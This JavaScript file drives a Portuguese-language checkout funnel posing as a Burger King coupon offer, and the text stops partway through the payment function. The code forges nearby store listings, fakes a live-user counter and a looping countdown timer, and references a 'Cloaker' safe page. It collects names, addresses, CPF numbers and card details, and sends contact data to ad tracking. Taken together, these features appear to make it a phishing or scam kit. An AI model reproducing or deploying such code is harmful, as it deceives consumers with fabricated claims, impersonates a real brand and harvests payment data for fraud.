const fbTracking = {
    defaultPixelId: '867666556327313', 
    pixelId: new URLSearchParams(window.location.search).get('pixel') || '',
    utms: ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'src', 'sck'].reduce((acc, param) => {
        const val = new URLSearchParams(window.location.search).get(param);
        if (val) {
            acc[param] = val;
            localStorage.setItem(`bk_funil_${param}`, val); // SALVA PERSISTENTE (UTMify Style)
        } else {
            acc[param] = localStorage.getItem(`bk_funil_${param}`) || ''; // RECUPERA DO CACHE
        }
        return acc;
    }, {})
};
fbTracking.pixelId = fbTracking.pixelId || fbTracking.defaultPixelId;

function initTracker() {
    if(!fbTracking.pixelId) {
        console.warn('⚠️ FB Pixel ID não encontrado na URL (?pixel=ID) nem no script.');
        return;
    }
    !function(f,b,e,v,n,t,s)
    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
    n.queue=[];t=b.createElement(e);t.async=!0;
    t.src=v;s=b.getElementsByTagName(e)[0];
    s.parentNode.insertBefore(t,s)}(window, document,'script',
    'https://connect.facebook.net/en_US/fbevents.js');
    
    fbq('init', fbTracking.pixelId);
    fbq('track', 'PageView');
    fireCAPI('PageView');
    
    // ─── SMART PAGE EVENTS ─────────────────────────────
    // Dispara eventos específicos por URL para treinar o Pixel do Meta 
    const pagePath = window.location.pathname.split('/').pop();
    const pageMap = {
        // Topo do funil: entrada
        'index.html':         () => firePixel('ViewContent',         { content_name: 'Página Inicial', content_category: 'Funil', value: 0.0, currency: 'BRL' }),
        'funil.html':         () => firePixel('ViewContent',         { content_name: 'Oferta Principal', content_category: 'Funil', value: 0.0, currency: 'BRL' }),
        'lista-cupons.html':  () => firePixel('ViewContent',         { content_name: 'Lista de Cupons', content_category: 'Funil', value: 0.0, currency: 'BRL' }),
        'cupom.html':         () => firePixel('ViewContent',         { content_name: 'Cupom Selecionado', content_category: 'Funil', value: 0.0, currency: 'BRL' }),
        // Meio do funil: engajamento forte
        'dados.html':         () => firePixel('InitiateCheckout',    { content_name: 'Preenchimento de Dados', num_items: 1, currency: 'BRL', value: (state.basePrice || 22.90) }),
        'loading.html':       () => firePixel('InitiateCheckout',    { content_name: 'Buscando Lojas', currency: 'BRL', value: (state.basePrice || 22.90) }),
        'lojas.html':         () => firePixel('ViewContent',         { content_name: 'Seleção de Loja', content_type: 'product', currency: 'BRL', value: (state.basePrice || 22.90) }),
        'sacola.html':        () => firePixel('AddToCart',           { content_name: 'Sacola de Compra', content_ids: ['bk-combo-v7'], content_type: 'product', currency: 'BRL', value: (state.basePrice || 22.90) }),
        // Fundo do funil: intenção máxima
        'pagamento.html':     () => firePixel('AddPaymentInfo',      { currency: 'BRL', value: ((state.basePrice || 22.90) + (state.fretePrice || 0)) }),
        'entrega.html':       () => firePixel('InitiateCheckout',    { currency: 'BRL', value: ((state.basePrice || 22.90) + (state.fretePrice || 0)), num_items: 1 }),
        'safe.html':          () => firePixel('ViewContent',         { content_name: 'Safe Page', content_category: 'Cloaker', value: 0.0, currency: 'BRL' })
    };

    // Dispara o evento correspondente  à página atual
    const handler = pageMap[pagePath];
    if (handler) {
        // Aguarda o state ser carregado antes de disparar
        setTimeout(handler, 100);
    }
}

async function fireCAPI(event, data = {}) {
    if(!fbTracking.pixelId) return;
    
    // Bloqueia fetch se estiver rodando via file:// (CORS bypass)
    if (window.location.protocol === 'file:') {
        console.log(`📡 CAPI Simulado (file://): ${event}`);
        return;
    }

    try {
        await fetch('api/fb-capi', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                event_name: event,
                pixel_id: fbTracking.pixelId,
                custom_data: {
                    ...data,
                    ...fbTracking.utms,
                    agent: 'Janus-Tesavek-Hybrid'
                },
                user: {
                    email: state.email || '',
                    phone: state.phone || ''
                }
            })
        });
    } catch(e) {
        // Erro silencioso em produção para não quebrar o UX
    }
}

function firePixel(event, data = {}) {
    if(!window.fbq || !fbTracking.pixelId) return;
    
    const enrichedData = {
        ...data,
        ...fbTracking.utms,
        content_category: 'BK Funil V7',
        agent: 'Janus-Tesavek-Omniscient'
    };
    
    // ─── RASTREAMENTO HÍBRIDO (CLIENT + SERVER) ───
    fbq('track', event, enrichedData, { eventID: data.event_id || null });
    fireCAPI(event, data); // Despacha para o servidor

    console.log(`🚀 Pixel Fired: ${event}`, enrichedData);
}

// BACK-REDIRECT REMOVIDO A PEDIDO

let state = {
    city: 'SÃO PAULO',
    cep: '',
    street: '',
    neighborhood: '',
    number: '',
    uf: '',
    addressFound: false,
    selectedStore: '',
    basePrice: 22.90,
    upsellTotal: 0,
    upsellItems: [],
    fretePrice: 0,
    freteLabel: 'Grátis',
    customizations: {},
    paymentMethod: 'pix',
    discount: 0,
    osmStores: null,
    nomeUser: '',
    cartItems: [
        { id: 'item_1', name: 'Whopper', qty: 2, price: 7.95, img: 'produtos/whopper.png', desc: 'Pão com gergelim, carne grelhada no fogo, queijo derretido, alface, tomate, cebola, picles, ketchup e maionese.' },
        { id: 'item_2', name: 'Batata Grande', qty: 1, price: 4.00, img: 'produtos/batata_frita.png', desc: 'Batata frita crocante, porção grande com sal.' },
        { id: 'item_3', name: 'Refrigerante 500ml', qty: 1, price: 3.00, img: 'produtos/pepsi.png', desc: 'Pepsi gelada 500ml.' }
    ],
    upsellOffered: false // Controle para não repetir o popup
};

// 💎 SYNC STATE (The Bridge)
function saveState() {
    localStorage.setItem('bk_v7_state', JSON.stringify(state));
}

function loadState() {
    const saved = localStorage.getItem('bk_v7_state');
    if (saved) {
        try {
            const parsed = JSON.parse(saved);
            Object.assign(state, parsed);
        } catch(e) { console.error('State Restore Fail', e); }
    }
}

// Inicializa o estado IMEDIATAMENTE
loadState();

// ─── DADOS ──────────────────────────────────────────
// ==========================================
// 🛡️ CONFIGURAÇÃO DE INTEGRAÇÃO REAL (API)
// ==========================================
// Mestre, para buscar os Burger Kings REAIS da cidade, coloque sua Chave API do Google Maps (Places) abaixo.
// Se deixar vazio (''), ou se a API falhar no dia de escala, o sistema de salvação "Smart Mocks" forjará a loja.
const GOOGLE_PLACES_API_KEY = ''; 

const storeMocks = {
    'SÃO PAULO': ['Av. Paulista, 1000', 'Shopping Itaquera', 'Drive Thru Ibirapuera'],
    'VOTORANTIM': ['BK Drive-Thru - Av. 31 de Março, 335', 'BK Shopping Iguatemi Esplanada', 'BK Votorantim Centro'],
    'SOROCABA': ['Burger King - Av. Itavuvu, 2300', 'BK Shopping Cidade Sorocaba', 'BK Campolim Drive'],
    'RIO DE JANEIRO': ['Copacabana', 'Barra Shopping', 'Botafogo Praia Shopping'],
    'BELO HORIZONTE': ['Praça Savassi', 'Shopping Cidade', 'Drive Thru Raja'],
    'CURITIBA': ['Batel', 'Shopping Mueller', 'Linha Verde Drive'],
    'PORTO ALEGRE': ['Shopping Iguatemi', 'Praça de Alimentação Praia de Belas', 'Drive Thru Assis Brasil'],
    'BRASÍLIA': ['Asa Sul', 'Conjunto Nacional', 'Drive Thru Águas Claras'],
    'SALVADOR': ['Shopping da Bahia', 'Salvador Shopping', 'Drive Thru Rio Vermelho'],
    'RECIFE': ['Shopping Recife', 'RioMar', 'Drive Thru Boa Viagem'],
    'FORTALEZA': ['Iguatemi Fortaleza', 'RioMar Kennedy', 'Aldeota'],
    'GERAL': ['Burger King - Shopping Central', 'BK Drive - Premium Delivery', 'BK - Unidade Express']
};

const fakeNames = ['Carlos','Ana','Pedro','Juliana','Lucas','Mariana','Rafael','Camila','Bruno','Fernanda','Gustavo','Larissa','Diego','Beatriz','Thiago','Amanda','Felipe','Letícia','Mateus','Isabela'];
const proofMessages = ['acabou de resgatar um cupom','garantiu o Combo Whopper','resgatou a oferta agora','acabou de fazer o pedido','aproveitou a promoção'];
const loadingCopies = ['Já encontramos unidades perto de você!','Verificando disponibilidade do combo...','Aplicando desconto exclusivo...','Quase lá! Preparando sua oferta...'];

// ─── DETECÇÃO DE CIDADE ─────────────────────────────
async function detectCity() {
    try {
        const r = await fetch('https://ipapi.co/json/');
        const d = await r.json();
        state.city = (d.city || 'SÃO PAULO').toUpperCase();
    } catch(e) { state.city = 'SÃO PAULO'; }
    // Não atualiza mais o app-location-tag aqui. Será preenchido pelo input do lead.
}

// ─── LIVE COUNTER (SOCIAL PROOF) ───────────────────
function initLiveCounter() {
    const el = document.getElementById('live-users-count');
    if(!el) return;
    
    let base = Math.floor(Math.random() * (2800 - 1500 + 1) + 1500);
    el.textContent = base.toLocaleString('pt-BR');
    
    setInterval(() => {
        const change = Math.floor(Math.random() * 7) - 3; // -3 a +3
        base += change;
        el.textContent = base.toLocaleString('pt-BR');
    }, 3000);
}

// ─── TIMER DE URGÊNCIA ──────────────────────────────
function initCountdown() {
    let s = 15 * 60 - 1;
    const el = document.querySelector('#countdown-timer');
    if (!el) return; // ⏳ Silencia se não houver timer na tela
    setInterval(() => {
        if (s <= 0) s = 15 * 60;
        el.textContent = `${String(Math.floor(s/60)).padStart(2,'0')}:${String(s%60).padStart(2,'0')}`;
        s--;
    }, 1000);
}

// ─── NAVEGAÇÃO ──────────────────────────────────────
// 🧭 NAVEGAÇÃO MULTI-PÁGINA (DESIGNER V8 SEPARATED)
function goToScreen(id) {
    saveState();

    const pageMap = {
        'roleta': 'index.html',
        'coupon': 'cupom.html',
        'cep': 'dados.html',
        'stores': 'lojas.html',
        'review': 'sacola.html',
        'pix': 'pagamento.html',
        'delivery': 'entrega.html',
        'loading': 'loading.html'
    };

    const targetFile = pageMap[id];
    if (targetFile) {
        console.log(`🚀 Redirecionando para: ${targetFile}`);
        window.location.href = targetFile;
    }
}


// ─── TRANSIÇÃO DADOS → LOADING (FAST TRACK V8) ─────────────────────
function proceedToStores() {
    // 🚀 Gera o nome da loja dinamicamente para pular a etapa de seleção
    let ruaFormatada = state.street ? state.street.replace(/(Rua|Avenida|Av\.|R\.)/gi, '').trim() : 'Principal';
    let nomeRuaAbreviada = ruaFormatada.split(' ').slice(0, 3).join(' ');
    let logradouro = state.street ? (state.street.toLowerCase().includes('av') ? 'Av.' : 'Rua') : 'Av.';
    
    state.selectedStore = `BK Drive - ${logradouro} ${nomeRuaAbreviada}`;
    
    saveState();
    window.location.href = 'loading.html';
}

// ─── CONFIRMAR DADOS (NOME E ENDEREÇO) ───────────────────
function confirmDeliveryDados() {
    const nome = document.querySelector('#input-nome').value.trim();
    const cepVal = document.querySelector('#input-cep').value.replace(/\D/g, '');
    const extraFields = document.getElementById('cep-extra-fields');
    
    if(!nome || nome.split(' ').length < 2) {
        const inp = document.querySelector('#input-nome');
        inp.focus();
        inp.style.boxShadow = 'inset 0 2px 4px rgba(0,0,0,0.05), 0 0 0 2px var(--bk-red)';
        setTimeout(() => { inp.style.boxShadow = ''; }, 1500);
        return;
    }
    
    if(!cepVal || cepVal.length !== 8) {
        const inp = document.querySelector('#input-cep');
        inp.focus();
        inp.style.boxShadow = 'inset 0 2px 4px rgba(0,0,0,0.05), 0 0 0 2px var(--bk-red)';
        setTimeout(() => { inp.style.boxShadow = ''; }, 1500);
        return;
    }

    // Se os campos extras ainda estiverem ocultos, revela e pede preenchimento
    if (extraFields && extraFields.style.display === 'none') {
        extraFields.style.display = 'block';
        extraFields.style.animation = 'fadeInUp 0.4s ease';
        const ruaInp = document.querySelector('#input-rua');
        if (ruaInp) setTimeout(() => ruaInp.focus(), 350);
        return;
    }

    const ruaVal = document.querySelector('#input-rua').value.trim();
    const bairroVal = document.querySelector('#input-bairro').value.trim();
    const cidadeVal = document.querySelector('#input-cidade').value.trim();
    const num = document.querySelector('#input-num').value.trim();

    if(!ruaVal || ruaVal.length < 3) {
        const inp = document.querySelector('#input-rua');
        inp.focus();
        inp.style.boxShadow = 'inset 0 2px 4px rgba(0,0,0,0.05), 0 0 0 2px var(--bk-red)';
        setTimeout(() => { inp.style.boxShadow = ''; }, 1500);
        return;
    }

    if(!bairroVal || bairroVal.length < 2) {
        const inp = document.querySelector('#input-bairro');
        inp.focus();
        inp.style.boxShadow = 'inset 0 2px 4px rgba(0,0,0,0.05), 0 0 0 2px var(--bk-red)';
        setTimeout(() => { inp.style.boxShadow = ''; }, 1500);
        return;
    }
    
    if (!num || num.length < 1) {
        const inp = document.querySelector('#input-num');
        inp.focus();
        inp.style.boxShadow = 'inset 0 2px 4px rgba(0,0,0,0.05), 0 0 0 2px var(--bk-red)';
        setTimeout(() => { inp.style.boxShadow = ''; }, 1500);
        return;
    }
    
    state.nomeUser = nome;
    state.street = ruaVal;
    state.neighborhood = bairroVal;
    
    if(cidadeVal) {
        state.city = cidadeVal.split('/')[0] ? cidadeVal.split('/')[0].trim().toUpperCase() : cidadeVal.toUpperCase();
    }
    
    state.number = num;
    if(!state.cep) state.cep = cepVal;

    // Atualiza a tag de localização na tela de lojas com a cidade do lead
    const locTag = document.querySelector('#app-location-tag');
    if(locTag) locTag.textContent = state.city || cidadeVal.toUpperCase();
    
    // Atualiza a interface estática do endereço pra quando o cara chegar na Sacola
    const addr = state.street 
        ? `${state.street}, ${state.number} - ${state.neighborhood || ''}` 
        : `CEP ${state.cep}, Nº ${state.number}`;
    
    const txtAddr = document.getElementById('review-address');
    if(txtAddr) txtAddr.textContent = addr;

    saveState();
    proceedToStores();
}

// ─── BUSCA VIA OSM (REAL DATA FALLBACK) ──────────────────
async function fetchStoresOSM() {
    if (!state.cep) return null;
    try {
        // Passo 1: Geocoding Reverso do CEP via Nominatim (Free & No Key)
        const geoReq = await fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${state.cep}+Brazil&limit=1`);
        const geoRes = await geoReq.json();
        if (!geoRes || geoRes.length === 0) return null;

        const { lat, lon } = geoRes[0];

        // Passo 2: Busca de BKs num raio de 15km via Overpass API
        const overpassQuery = `[out:json];node["amenity"="fast_food"]["brand"~"Burger King",i](around:15000,${lat},${lon});out;`;
        const overpassUrl = `https://overpass-api.de/api/interpreter?data=${encodeURIComponent(overpassQuery)}`;
        
        const storeReq = await fetch(overpassUrl);
        const storeRes = await storeReq.json();

        if (storeRes.elements && storeRes.elements.length > 0) {
            return storeRes.elements.slice(0, 3).map(el => {
                let name = el.tags.name || 'Burger King';
                // Se o nome vier sem a marca, forçamos para o Lead saber que é BK
                if (!name.toUpperCase().includes('BURGER')) name = 'BK - ' + name;
                return name;
            });
        }
    } catch(e) {
        console.warn('Real Stores Fetch Failed (OSM):', e);
    }
    return null;
}

// ─── INIT API GOOGLE MAPS ───────────────────────────
function loadGoogleMapsScript(callback) {
    if (window.google && window.google.maps) { callback(); return; }
    if (!GOOGLE_PLACES_API_KEY) { callback(); return; }
    const script = document.createElement('script');
    script.src = `https://maps.googleapis.com/maps/api/js?key=${GOOGLE_PLACES_API_KEY}&libraries=places`;
    script.onload = () => callback();
    script.onerror = () => callback();
    document.head.appendChild(script);
}

// ─── RENDERIZAR LOJAS ───────────────────────────────
function renderStoresWithGoogle(list, callback) {
    if (!window.google || !window.google.maps || !state.addressFound) {
        callback(false); return;
    }
    const service = new google.maps.places.PlacesService(document.createElement('div'));
    const request = { query: `Burger King in ${state.city}, ${state.uf}, Brazil` };

    service.textSearch(request, (results, status) => {
        if (status === google.maps.places.PlacesServiceStatus.OK && results.length > 0) {
            let names = results.slice(0, 3).map(r => {
                let name = r.name;
                if (!name.toLowerCase().includes('burger')) name = 'BK - ' + name;
                return name.length > 30 ? name.substring(0, 28) + '...' : name;
            });
            callback(true, names);
        } else {
            callback(false);
        }
    });
}

function renderStores() {
    const list = document.querySelector('#stores-list');
    list.innerHTML = '';
    
    const applyMocks = () => {
        let fallbacks = storeMocks[state.city] || null;
        
        // Se a cidade não estiver no mapa fixo, mimetizamos o ambiente urbano baseando no CEP
        if (!fallbacks) {
            let ruaFormatada = state.street ? state.street.replace(/(Rua|Avenida|Av\.|R\.)/gi, '').trim() : 'Principal';
            let nomeRuaAbreviada = ruaFormatada.split(' ').slice(0, 3).join(' ');
            let numeroAleatorio = Math.floor(Math.random() * 800) + 100;
            let logradouro = state.street ? (state.street.toLowerCase().includes('av') ? 'Av.' : 'Rua') : 'Av.';
            
            fallbacks = [
                `BK Drive-Thru - ${logradouro} ${nomeRuaAbreviada}, ${numeroAleatorio}`,
                `BK Shopping ${state.city || 'Center'}`,
                `BK ${state.neighborhood || 'Centro'} - ${state.city || 'Unidade'}`
            ];
        }
        buildStoreCards(fallbacks, list);
    };

    if (GOOGLE_PLACES_API_KEY && state.addressFound) {
        renderStoresWithGoogle(list, (success, realNames) => {
            if (success && realNames) {
                buildStoreCards(realNames, list);
            } else {
                applyMocks();
            }
        });
    } else if (state.osmStores && state.osmStores.length > 0) {
        // Prioridade 2: Dados Reais via OpenStreetMap se detectados
        buildStoreCards(state.osmStores, list);
    } else {
        // Prioridade 3: Geração Dinâmica Baseada em Endereço
        applyMocks();
    }
}

function buildStoreCards(storeNames, list) {
    storeNames.forEach((s, i) => {
        const card = document.createElement('div');
        card.className = 'store-card';
        card.innerHTML = `
            <div class="store-card-img">
                <img src="https://upload.wikimedia.org/wikipedia/commons/c/cc/Burger_King_2020.svg">
            </div>
            <div class="store-card-info">
                <h4>${s}</h4>
                <div class="store-card-status">
                    <span class="open"><i class="fa-solid fa-circle" style="font-size: 6px;"></i> Aberto agora</span>
                    <span style="opacity: 0.3;">•</span>
                    <span>${15 + Math.floor(Math.random() * 25)} min</span>
                </div>
                <div class="store-card-dist">
                    <i class="fa-solid fa-location-dot" style="font-size: 9px;"></i>
                    ${(0.4 + Math.random() * 3.8).toFixed(1)} km de você
                </div>
            </div>
            <i class="fa-solid fa-chevron-right" style="color: #D3C6B9; font-size: 14px;"></i>
        `;
        card.addEventListener('click', () => selectStore(s));
        list.appendChild(card);
    });
}

// ─── SELECIONAR LOJA → REVIEW ───────────────────────
// ─── SELECIONAR LOJA → REVIEW ───────────────────────
function selectStore(storeName) {
    state.selectedStore = storeName;
    state.upsellTotal = 0;
    state.upsellItems = [];
    state.fretePrice = 0;
    state.freteLabel = 'Grátis';

    // Reset upsell visual (apenas se os elementos existirem)
    document.querySelectorAll('.upsell-item').forEach(el => el.classList.remove('selected'));

    // Reset frete visual
    document.querySelectorAll('.frete-option').forEach(el => el.classList.remove('selected'));
    const defaultFrete = document.querySelector('.frete-option[data-frete="0"]');
    if (defaultFrete) defaultFrete.classList.add('selected');

    // Reset chips
    document.querySelectorAll('.customize-check').forEach(cb => { cb.checked = true; });

    // Atualização de UI (Apenas se estivermos na mesma página ou se os elementos existirem)
    const storeNameEl = document.querySelector('#review-store-name');
    if (storeNameEl) storeNameEl.textContent = `BK - ${storeName}`;

    const addr = state.street
        ? `${state.street}, ${state.number} - ${state.neighborhood || ''}`
        : `CEP ${state.cep}, Nº ${state.number}`;

    const addrEl = document.querySelector('#review-address');
    if (addrEl) addrEl.textContent = addr;

    if (typeof updateTotal === 'function') updateTotal();
    
    saveState();
    
    // Roteamento físico para Sacola
    goToScreen('review');
}

// ─── UPSELL TOGGLE ──────────────────────────────────
function toggleUpsell(el) {
    if (!el) return;
    const price = parseFloat(el.dataset.price);
    const name = el.dataset.name;

    el.classList.toggle('selected');

    if (el.classList.contains('selected')) {
        state.upsellTotal += price;
        state.upsellItems.push(name);
        // Feedback visual de pulso
        el.classList.add('item-pulse');
        setTimeout(() => el.classList.remove('item-pulse'), 500);
    } else {
        state.upsellTotal -= price;
        state.upsellItems = state.upsellItems.filter(n => n !== name);
    }
    updateTotal();
    saveState();
}

// ─── FRETE ──────────────────────────────────────────
function selectFrete(el) {
    if (!el) return;
    document.querySelectorAll('.frete-option').forEach(opt => opt.classList.remove('selected'));
    el.classList.add('selected');
    state.fretePrice = parseFloat(el.dataset.frete) || 0;
    state.freteLabel = state.fretePrice === 0 ? 'Grátis' : `R$ ${state.fretePrice.toFixed(2).replace('.', ',')}`;
    updateTotal();
    saveState();
}

// ─── PAYMENT MASKS & SELECTOR ───────────────────────
function selectPaymentMethod(method) {
    state.paymentMethod = method;
    document.querySelectorAll('.pay-tab').forEach(t => t.classList.remove('active'));
    const activeTab = document.querySelector(`.pay-tab[data-method="${method}"]`);
    if (activeTab) activeTab.classList.add('active');

    const ccContainer = document.getElementById('cc-form-container');
    if (ccContainer) {
        if (method === 'cc') {
            ccContainer.style.display = 'block';
            setTimeout(() => ccContainer.classList.add('active'), 10);
        } else {
            ccContainer.classList.remove('active');
            setTimeout(() => ccContainer.style.display = 'none', 500);
        }
    }
    updateTotal();
}
function maskCC(i) {
    let v = i.value.replace(/\D/g, "");
    v = v.replace(/(\d{4})(?=\d)/g, "$1 ");
    i.value = v;
}
function maskExpiry(i) {
    let v = i.value.replace(/\D/g, "");
    if (v.length > 2) v = v.substring(0,2) + '/' + v.substring(2,4);
    i.value = v;
}
function maskCPF(i) {
    let v = i.value.replace(/\D/g, "");
    if (v.length > 9) v = v.substring(0,3) + '.' + v.substring(3,6) + '.' + v.substring(6,9) + '-' + v.substring(9,11);
    else if (v.length > 6) v = v.substring(0,3) + '.' + v.substring(3,6) + '.' + v.substring(6);
    else if (v.length > 3) v = v.substring(0,3) + '.' + v.substring(3);
    i.value = v;
    // Salva CPF limpo no state para uso no PIX
    state.cpf = v.replace(/\D/g, '');
}

// ─── ATUALIZAR TOTAL ────────────────────────────────
function updateTotal() {
    // Calcula subtotal dos itens dinâmicos do carrinho
    const itemsSubtotal = state.cartItems.reduce((acc, item) => acc + (item.price * item.qty), 0);
    state.basePrice = itemsSubtotal;

    let subtotal = (state.basePrice || 0) + (state.upsellTotal || 0);
    let total = subtotal + (state.fretePrice || 0);
    if (state.discount > 0) total = total * (1 - state.discount);

    const fmt = (v) => `R$ ${v.toFixed(2).replace('.', ',')}`;

    const subEl = document.querySelector('#subtotal-value');
    if (subEl) subEl.textContent = fmt(subtotal);

    const freteEl = document.querySelector('#frete-value');
    if (freteEl) {
        freteEl.textContent = state.freteLabel || 'Grátis';
        freteEl.className = (state.fretePrice === 0) ? 'frete-free-text' : '';
    }

    const orderTotalEl = document.querySelector('#order-total');
    if (orderTotalEl) {
        orderTotalEl.innerHTML = (state.discount > 0) 
            ? `<s style="color:#999;font-size:12px;">${fmt(subtotal + (state.fretePrice || 0))}</s> <span style="color:var(--ifood-red);">${fmt(total)}</span>` 
            : fmt(total);
    }

    const btnTotalEl = document.querySelector('#btn-total-value');
    if (btnTotalEl) btnTotalEl.textContent = fmt(total);
    
    // Parcela generator
    if (state.paymentMethod === 'cc') {
        const select = document.getElementById('cc_installments');
        if (select) {
            select.innerHTML = '';
            const limit = total < 50 ? 2 : 12; 
            for(let i=1; i<=limit; i++){
                let px = (total / i).toFixed(2).replace('.',',');
                select.innerHTML += `<option value="${i}">${i}x de R$ ${px} ${i===1?'sem juros':''}</option>`;
            }
        }
    }

    renderAddress();
    saveState();
}

function renderAddress() {
    const addrEl = document.getElementById('review-address');
    if (!addrEl) return;

    // Tenta montar o endereço de várias fontes para garantir persistência
    let rua = state.street || (state.address && state.address.street) || '';
    let num = state.number || (state.address && state.address.number) || '';
    let bairro = state.neighborhood || (state.address && state.address.neighborhood) || '';

    if (rua && num) {
        addrEl.textContent = `${rua}, ${num}${bairro ? ' - ' + bairro : ''}`;
    } else if (state.cep) {
        addrEl.textContent = `CEP ${state.cep}, Nº ${num || 'S/N'}`;
    } else {
        addrEl.textContent = "Endereço não informado";
    }
}

function renderCart() {
    const container = document.getElementById('cart-items-container');
    if (!container) {
        console.error('Container de itens não encontrado!');
        return;
    }

    if (!state.cartItems || state.cartItems.length === 0) {
        container.innerHTML = '<div style="padding: 20px; text-align: center; color: #717171;">Sua sacola está vazia</div>';
        updateTotal();
        return;
    }

    const fmt = (v) => `R$ ${v.toFixed(2).replace('.', ',')}`;

    container.innerHTML = state.cartItems.map(item => `
        <div class="item-card" data-id="${item.id}">
            <img src="${item.img}" class="item-img" alt="${item.name}">
            <div class="item-card-info">
                <p class="item-name">${item.name}</p>
                <p class="item-desc">${item.desc}</p>
                <div class="item-price-row">
                    <p class="item-price">${fmt(item.price * item.qty)}</p>
                    <div class="qty-control">
                        <button onclick="changeQty('${item.id}', -1)"><i class="fa-solid fa-minus"></i></button>
                        <span>${item.qty}</span>
                        <button onclick="changeQty('${item.id}', 1)"><i class="fa-solid fa-plus"></i></button>
                    </div>
                </div>
            </div>
        </div>
    `).join('');
    
    updateTotal();
}

function changeQty(itemId, delta) {
    const item = state.cartItems.find(i => i.id === itemId);
    if (item) {
        item.qty = Math.max(1, item.qty + delta);
        
        // Feedback visual de pulso no item
        const card = document.querySelector(`.item-card[data-id="${itemId}"]`);
        if (card) {
            card.classList.remove('item-pulse');
            void card.offsetWidth; // Trigger reflow
            card.classList.add('item-pulse');
        }
        
        renderCart();
    }
}

// ─── FINALIZAR DE PAGAMENTO (COMPLEX BOUNCE) ────────────────
let currentTxId = null;
let pixInterval = null;

async function goToPayment() {
    // 🚀 INTERSTITIAL ORDER BUMP MULTI (Upsell Estratégico Coletivo)
    if (!state.upsellOffered && state.cartItems.length > 0) {
        const res = await Swal.fire({
            title: 'Deseja turbinar seu lanche? 🔥',
            html: `
            <div style="text-align: left; padding: 10px;">
                <p style="font-size: 13px; color: #666; margin-bottom: 20px; font-weight: 500;">Selecione os itens e adicione ao seu combo com um clique:</p>
                
                <div class="bump-list" style="max-height: 400px; overflow-y: auto;">
                    <!-- Item 1 -->
                    <label class="bump-option" style="display:flex; align-items:center; gap:12px; padding:12px; background:#f8f8f8; border-radius:12px; margin-bottom:10px; cursor:pointer; border: 1.5px solid transparent; transition:0.2s;">
                        <input type="checkbox" class="bump-check" data-id="bump_1" data-name="Onion Rings (G)" data-price="14.90" data-img="produtos/onion_rings.png" style="accent-color:#502314; width:20px; height:20px;">
                        <img src="produtos/onion_rings.png" onerror="this.src='onion_rings.png'" style="width:40px; height:40px; border-radius:8px;">
                        <div style="flex:1;">
                            <p style="font-size:14px; font-weight:900; color:#502314; margin:0;">Onion Rings (G)</p>
                            <p style="font-size:12px; font-weight:800; color:#ea1d2c; margin:0;">+ R$ 14,90</p>
                        </div>
                    </label>

                    <!-- Item 2 -->
                    <label class="bump-option" style="display:flex; align-items:center; gap:12px; padding:12px; background:#f8f8f8; border-radius:12px; margin-bottom:10px; cursor:pointer; border: 1.5px solid transparent;">
                        <input type="checkbox" class="bump-check" data-id="bump_2" data-name="BK Mix Nutella" data-price="16.90" data-img="produtos/bk_mix_nutella.png" style="accent-color:#502314; width:20px; height:20px;">
                        <img src="produtos/bk_mix_nutella.png" onerror="this.src='milkshake.png'" style="width:40px; height:40px; border-radius:8px;">
                        <div style="flex:1;">
                            <p style="font-size:14px; font-weight:900; color:#502314; margin:0;">BK Mix Nutella</p>
                            <p style="font-size:12px; font-weight:800; color:#ea1d2c; margin:0;">+ R$ 16,90</p>
                        </div>
                    </label>

                    <!-- Item 3 -->
                    <label class="bump-option" style="display:flex; align-items:center; gap:12px; padding:12px; background:#f8f8f8; border-radius:12px; margin-bottom:10px; cursor:pointer; border: 1.5px solid transparent;">
                        <input type="checkbox" class="bump-check" data-id="bump_3" data-name="BK Chicken (10 un)" data-price="22.90" data-img="produtos/bk_chicken.png" style="accent-color:#502314; width:20px; height:20px;">
                        <img src="produtos/bk_chicken.png" onerror="this.src='chicken_nuggets.png'" style="width:40px; height:40px; border-radius:8px;">
                        <div style="flex:1;">
                            <p style="font-size:14px; font-weight:900; color:#502314; margin:0;">BK Chicken (10 un)</p>
                            <p style="font-size:12px; font-weight:800; color:#ea1d2c; margin:0;">+ R$ 22,90</p>
                        </div>
                    </label>

                    <!-- Item 4 -->
                    <label class="bump-option" style="display:flex; align-items:center; gap:12px; padding:12px; background:#f8f8f8; border-radius:12px; margin-bottom:10px; cursor:pointer; border: 1.5px solid transparent;">
                        <input type="checkbox" class="bump-check" data-id="bump_4" data-name="Balde de Batata" data-price="24.90" data-img="produtos/balde_de_batata.png" style="accent-color:#502314; width:20px; height:20px;">
                        <img src="produtos/balde_de_batata.png" onerror="this.src='fries_item.png'" style="width:40px; height:40px; border-radius:8px;">
                        <div style="flex:1;">
                            <p style="font-size:14px; font-weight:900; color:#502314; margin:0;">Balde de Batata</p>
                            <p style="font-size:12px; font-weight:800; color:#ea1d2c; margin:0;">+ R$ 24,90</p>
                        </div>
                    </label>

                    <!-- Item 5 -->
                    <label class="bump-option" style="display:flex; align-items:center; gap:12px; padding:12px; background:#f8f8f8; border-radius:12px; margin-bottom:10px; cursor:pointer; border: 1.5px solid transparent;">
                        <input type="checkbox" class="bump-check" data-id="bump_5" data-name="Sundae Chocolate" data-price="12.90" data-img="produtos/sundae_chocolate.png" style="accent-color:#502314; width:20px; height:20px;">
                        <img src="produtos/sundae_chocolate.png" onerror="this.src='sundae.png'" style="width:40px; height:40px; border-radius:8px;">
                        <div style="flex:1;">
                            <p style="font-size:14px; font-weight:900; color:#502314; margin:0;">Sundae Chocolate</p>
                            <p style="font-size:12px; font-weight:800; color:#ea1d2c; margin:0;">+ R$ 12,90</p>
                        </div>
                    </label>
                </div>
            </div>
            `,
            showConfirmButton: true,
            confirmButtonText: '<i class="fa-solid fa-plus"></i> ADICIONAR & PAGAR',
            showCancelButton: true,
            cancelButtonText: 'Não, obrigado, só esses',
            buttonsStyling: false,
            customClass: {
                confirmButton: 'swal-btn-upsell-confirm',
                cancelButton: 'swal-btn-upsell-cancel'
            },
            preConfirm: () => {
                const selected = [];
                document.querySelectorAll('.bump-check:checked').forEach(chk => {
                    selected.push({
                        id: chk.getAttribute('data-id'),
                        name: chk.getAttribute('data-name'),
                        price: parseFloat(chk.getAttribute('data-price')),
                        img: chk.getAttribute('data-img')
                    });
                });
                return selected;
            }
        });

        if (res.isConfirmed && res.value && res.value.length > 0) {
